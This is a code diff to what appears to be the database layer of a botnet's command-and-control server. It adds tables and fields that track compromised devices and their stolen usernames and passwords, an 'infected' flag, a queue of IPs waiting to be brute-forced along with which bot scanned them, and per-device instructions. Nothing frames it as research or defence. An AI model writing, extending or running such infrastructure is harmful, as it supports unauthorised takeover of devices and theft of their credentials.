@@ -45,13 +45,21 @@ def db_init():
             uptime      REAL,
             first_seen  TEXT,
             last_seen   TEXT,
-            instruction TEXT
+            infected    INTEGER
         );
 
         CREATE TABLE IF NOT EXISTS devices_tobrute (
             device_id   INTEGER PRIMARY KEY AUTOINCREMENT,
             ip          TEXT UNIQUE,
-            scanned_by_ip TEXT
+            scanned_by_ip TEXT,
+            bruted INTEGER
+        );
+
+        CREATE TABLE IF NOT EXISTS instructions (
+            device_id TEXT PRIMARY KEY,
+            instruction TEXT,
+            status INT,
+            FOREIGN KEY (device_id) REFERENCES devices(device_id)
         );
     """) # TODO:
     # scanned_by_ip is useful to keep if we want to tell the device who found it to also brute it
@@ -63,22 +71,22 @@ def db_insert(device_id, ip, username, password):
     con = get_con()
     now = datetime.datetime.now(datetime.UTC)
     con.execute("""
-        INSERT INTO devices (device_id, ip, username, password, first_seen, last_seen)
-        VALUES (?, ?, ?, ?, ?, ?)
+        INSERT INTO devices (device_id, ip, username, password, first_seen, last_seen, infected)
+        VALUES (?, ?, ?, ?, ?, ?, ?)
         ON CONFLICT(device_id) DO UPDATE SET
             ip        = excluded.ip,
             username  = excluded.username,
             password  = excluded.password,
             last_seen = excluded.last_seen
-    """, (device_id, ip, username, password, now, now))
+    """, (device_id, ip, username, password, now, now, 0))
     con.commit()
     con.close()
 
 def db_insert_tobrute(ip, scanned_by_ip):
     con = get_con()
     con.execute("""
-        INSERT INTO devices_tobrute (ip, scanned_by_ip)
-        VALUES (?, ?)
+        INSERT INTO devices_tobrute (ip, scanned_by_ip, bruted)
+        VALUES (?, ?, 0)
         ON CONFLICT(ip) DO NOTHING
     """, [ip, scanned_by_ip])
     con.commit()
